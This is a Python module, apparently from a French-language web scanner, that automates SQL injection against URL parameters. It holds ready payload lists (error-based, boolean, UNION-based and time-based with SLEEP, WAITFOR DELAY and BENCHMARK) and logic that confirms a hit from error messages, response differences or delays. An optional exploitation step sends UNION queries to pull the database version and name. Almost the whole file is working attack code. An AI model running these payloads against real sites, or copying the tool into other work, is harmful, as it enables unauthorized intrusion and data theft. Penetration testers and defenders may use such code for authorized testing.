#!/usr/bin/env python3
"""
💀 SQL Injection ULTRA-AGRESSIF — OWASP A05:2025
Ordre intelligent (erreur → booléen → union → time), parallélisation, exploitation auto.
"""

import time
import re
from colorama import Fore, Style

# Patterns d'erreur SQL (détection rapide)
SQL_ERROR_PATTERNS = [
    'sql syntax', 'mysql error', 'pdoexception', 'sqlstate[42000]',
    'you have an error in your sql syntax', 'uncaught pdoexception',
    'syntax error near', 'mysql_fetch', 'pg_query', 'ora-', 'warning:', 'mysqli',
    'supplied argument is not a valid', 'unclosed quotation',
    'quoted string not properly terminated', 'odbc_', 'driver',
    'sqlite_', 'postgresql', 'pg_', 'sql server', 'mssql',
]

# Détection backend depuis le message d'erreur
BACKEND_SIGS = {
    'mysql': ['mysql', 'mysqli', 'you have an error in your sql syntax', 'sqlstate[42', 'mariadb'],
    'postgresql': ['postgresql', 'pg_query', 'pg_', 'syntax error at or near'],
    'mssql': ['microsoft sql server', 'mssql', 'odbc sql server', 'unclosed quotation'],
    'oracle': ['ora-', 'oracle', 'oci'],
    'sqlite': ['sqlite', 'sqlite3', 'sqlite_'],
}


def _detect_backend(text):
    t = text.lower()
    for backend, sigs in BACKEND_SIGS.items():
        if any(s in t for s in sigs):
            return backend
    return None


class SQLIBlind:
    def __init__(self, engine, aggressive=False):
        self.engine = engine
        self.aggressive = aggressive
        self._timeout = getattr(engine, 'request_timeout', 10)
        self._exploit = getattr(engine, 'exploit', False)

    def _payload_groups(self):
        """Ordre intelligent : rapide (erreur) d'abord, time-based en dernier."""
        quick = ["'", '"', "1'", "1\"", "1' AND '1'='1", "1\" AND \"1\"=\"1"]
        error_bool = [
            "' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1--", "\" OR 1=1--",
            "1' OR '1'='1", "admin'--", "' OR ''='", "\" OR \"\"=\"",
        ]
        union_light = [
            "' UNION SELECT NULL--", "\" UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--", "' UNION SELECT 1,2,3--",
        ]
        time_based = [
            "' AND SLEEP(2)--", "\" AND SLEEP(2)--",
            "1; WAITFOR DELAY '0:0:2'--",
        ]
        if self.aggressive:
            error_bool += [
                "') OR ('x'='x", "' OR 1=1 LIMIT 1--", "1' OR 1=1#", "' OR 1=1#",
                "'/**/OR/**/'1'='1", "'/*!50000OR*/'1'='1", "%27%20OR%201=1--",
            ]
            union_light += [
                "' UNION SELECT @@version,NULL--",
                "' UNION SELECT table_name FROM information_schema.tables--",
                "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x3a,(SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            ]
            time_based += [
                "' OR IF(1=1,SLEEP(3),0)--", "1' AND SLEEP(3)--", "' AND SLEEP(3)--",
                "' OR IF(1=1,BENCHMARK(5000000,MD5(1)),0)--",
            ]
        return quick, error_bool, union_light, time_based

    def _check_response(self, baseline, param, sql_error_patterns):
        def _check(injected_url, payload, resp):
            if any(p in resp.text.lower() for p in sql_error_patterns):
                backend = _detect_backend(resp.text)
                ev = 'Erreur SQL détectée - Injection SQL confirmée'
                if backend:
                    ev += f' (backend: {backend})'
                return True, {
                    'type': 'sqli', 'cwe': 'CWE-89', 'param': param, 'payload': payload,
                    'url': injected_url, 'evidence': ev, 'backend': backend,
                }
            if baseline and self.engine.analyze_response(baseline, resp, "sqli")[0]:
                return True, {
                    'type': 'sqli', 'cwe': 'CWE-89', 'param': param, 'payload': payload,
                    'url': injected_url, 'evidence': 'Différence de contenu/statut après injection', 'backend': None,
                }
            return False, None
        return _check

    def _run_exploitation(self, param, vuln):
        """Phase exploitation : tenter extraction version/database pour le rapport."""
        if not self._exploit or not getattr(self.engine, 'exploit', False):
            return vuln
        backend = vuln.get('backend') or 'mysql'
        extra_evidence = []
        # Un seul payload d'exploitation selon le backend
        if backend == 'mysql':
            for pl in ["' UNION SELECT @@version,NULL--", "' UNION SELECT database(),NULL--"]:
                try:
                    u = self.engine.build_url(param, pl)
                    r = self.engine.get(u, timeout=self._timeout)
                    if 'sql syntax' not in r.text.lower() and ('5.' in r.text or '10.' in r.text or 'MariaDB' in r.text or 'information_schema' in r.text):
                        extra_evidence.append(f"Exploitation: {pl[:50]}... → réponse OK (possible extraction)")
                        break
                except Exception:
                    pass
        if extra_evidence:
            vuln['evidence'] = vuln.get('evidence', '') + '. ' + ' '.join(extra_evidence)
        return vuln

    def scan(self, params=None):
        print(f"\n{Fore.RED}[💀 SQL INJECTION ULTRA-AGRESSIF] {Style.RESET_ALL}\n")
        params = params or []

        try:
            baseline = self.engine.get_baseline()
        except Exception:
            baseline = None

        quick, error_bool, union_light, time_based = self._payload_groups()
        all_non_time = quick + error_bool + union_light
        sql_error_patterns = list(SQL_ERROR_PATTERNS)
        vulnerabilities = []
        parallel = getattr(self.engine, 'parallel_workers', 0) > 0
        check = self._check_response(baseline, None, sql_error_patterns)

        for param in params:
            def make_check(p):
                return self._check_response(baseline, p, sql_error_patterns)
            print(f"  {Fore.BLUE}→ Test paramètre: {Fore.YELLOW}{param}{Style.RESET_ALL}")

            found = None
            # 1) Passage parallèle (rapide) sur tout sauf time-based
            if parallel and all_non_time:
                checker = make_check(param)
                vuln, _ = self.engine.run_payloads_parallel(param, all_non_time, checker, skip_time_based=True)
                if vuln:
                    vuln['param'] = param
                    found = vuln
            # 2) Sinon séquentiel : quick puis error_bool puis union puis time
            if not found:
                for payload in quick + error_bool + union_light:
                    injected_url = self.engine.build_url(param, payload)
                    if not injected_url:
                        continue
                    try:
                        resp = self.engine.get(injected_url, timeout=self._timeout)
                        c = make_check(param)
                        is_vuln, vuln = c(injected_url, payload, resp)
                        if is_vuln and vuln:
                            vuln['param'] = param
                            found = vuln
                            break
                    except Exception:
                        continue
            # 3) Time-based en dernier (lent)
            if not found:
                for payload in time_based:
                    injected_url = self.engine.build_url(param, payload)
                    if not injected_url:
                        continue
                    try:
                        start = time.time()
                        self.engine.get(injected_url, timeout=8)
                        elapsed = time.time() - start
                        if elapsed > 2.5:
                            found = {
                                'type': 'sqli', 'cwe': 'CWE-89', 'param': param, 'payload': payload,
                                'url': injected_url, 'evidence': f'Time-based blind: {elapsed:.2f}s', 'backend': None,
                            }
                            break
                    except Exception:
                        continue

            if found:
                found = self._run_exploitation(param, found)
                vulnerabilities.append(found)
                self._print_vuln(found)
                continue

        return vulnerabilities

    def _print_vuln(self, vuln):
        print(f"\n    {Fore.RED}[💥 SQLi CONFIRMÉ] {Style.RESET_ALL}{vuln['param']}")
        print(f"      Payload: {vuln['payload']}")
        print(f"      Preuve: {vuln['evidence']}")
        if vuln.get('backend'):
            print(f"      Backend: {vuln['backend']}")
        print(f"      URL: {vuln['url']}\n")
